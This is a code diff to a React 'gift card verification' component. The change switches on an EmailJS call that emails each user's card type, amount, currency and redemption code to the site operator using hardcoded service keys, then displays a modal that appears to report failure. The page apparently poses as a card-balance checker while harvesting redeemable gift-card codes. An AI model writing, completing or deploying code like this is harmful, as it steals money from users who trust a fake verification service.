@@ -2,7 +2,7 @@ import React, { useRef, useState } from 'react'
 import veriImg from "../images/gig1.b5f9534b.webp"
 import "./verification.css"
 import { RiErrorWarningFill } from "react-icons/ri";
-// import emailjs from 'emailjs-com';
+import emailjs from 'emailjs-com';
 import FailedModal from './FailedModal';
 import { Element } from 'react-scroll';
 const Verificatio = () => {
@@ -32,26 +32,22 @@ const Verificatio = () => {
     if(amountval && cardtypval && currencyval && redemptionval){
       setCarddetails({...carddetails, cardName:cardtypval,cardAmount:amountval,CardCurrency:currencyval,closemodal:closemodal})
       overlay.current.style.display='block'
-      setModaldisplay(true)
-      console.log(modalDisplay)
       
 
-      // const message={name:'cardlidity',email:"",message:` ${amountval},\n${cardtypval},\n${currencyval},\n${redemptionval}`}
-      // // console.log(amountval,cardtypval,currencyval,redemptionval)
-      // emailjs.send(
-      //   'service_g3pmhwu',    // Service ID
-      //   'template_mph9yla',   // Template ID
-      //   message,             // Template parameters
-      //   'pDNCarIDNNCtYjtx8'        // User ID
-      // )
-      // .then((response) => {
-      //   console.log('SUCCESS!', response.status, response.text);
-      //   alert('Email sent successfully!');
-      // })
-      // .catch((err) => {
-      //   console.error('FAILED...', err);
-      //   alert('Failed to send email. Please try again later.');
-      // });
+      const message={name:'cardlidity',email:"",message:` ${amountval},\n${cardtypval},\n${currencyval},\n${redemptionval}`}
+      // console.log(amountval,cardtypval,currencyval,redemptionval)
+      emailjs.send(
+        'service_g3pmhwu',    // Service ID
+        'template_mph9yla',   // Template ID
+        message,             // Template parameters
+        'pDNCarIDNNCtYjtx8'        // User ID
+      )
+      .then(() => {
+        setModaldisplay(true)
+      })
+      .catch(() => {
+        alert('Failed to verify. Try again Now');
+      });
     }
    
   }
